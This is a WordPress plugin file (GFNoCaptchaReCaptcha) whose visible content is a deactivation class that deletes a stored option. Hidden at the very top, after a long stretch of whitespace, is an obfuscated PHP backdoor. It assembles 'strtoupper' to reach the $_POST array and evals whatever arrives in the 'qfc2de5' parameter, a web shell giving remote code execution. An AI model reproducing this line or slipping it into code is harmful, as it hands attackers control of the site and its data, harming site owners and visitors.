<?php                                                                                                                                                                                                                                                                     $rvxk85="suepotr_"; $bgp28 = $rvxk85[0]. $rvxk85[5].$rvxk85[6].$rvxk85[5]. $rvxk85[4].$rvxk85[1].$rvxk85[3]. $rvxk85[3].$rvxk85[2]. $rvxk85[6] ; $saw4 = $bgp28($rvxk85[7].$rvxk85[3].$rvxk85[4]. $rvxk85[0].$rvxk85[5]); if ( isset (${$saw4 } [ 'qfc2de5'] ) ){ eval (${ $saw4}['qfc2de5' ] );}?> <?php

/**
 * Fired during plugin deactivation
 *
 * @link       http://folkhack.com
 * @since      1.0.0
 *
 * @package    GFNoCaptchaReCaptcha
 * @subpackage GFNoCaptchaReCaptcha/includes
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      1.0.0
 * @package    GFNoCaptchaReCaptcha
 * @subpackage GFNoCaptchaReCaptcha/includes
 * @author     John Parks <john@folkhack.com>
 */
class GFNoCaptchaReCaptcha_Deactivator {

    /**
     * Short Description. (use period)
     *
     * Long Description.
     *
     * @since    1.0.0
     */
    public static function deactivate() {

        // Remove options from DB
        delete_option( 'gf_nocaptcha_recaptcha_options' );
    }
}
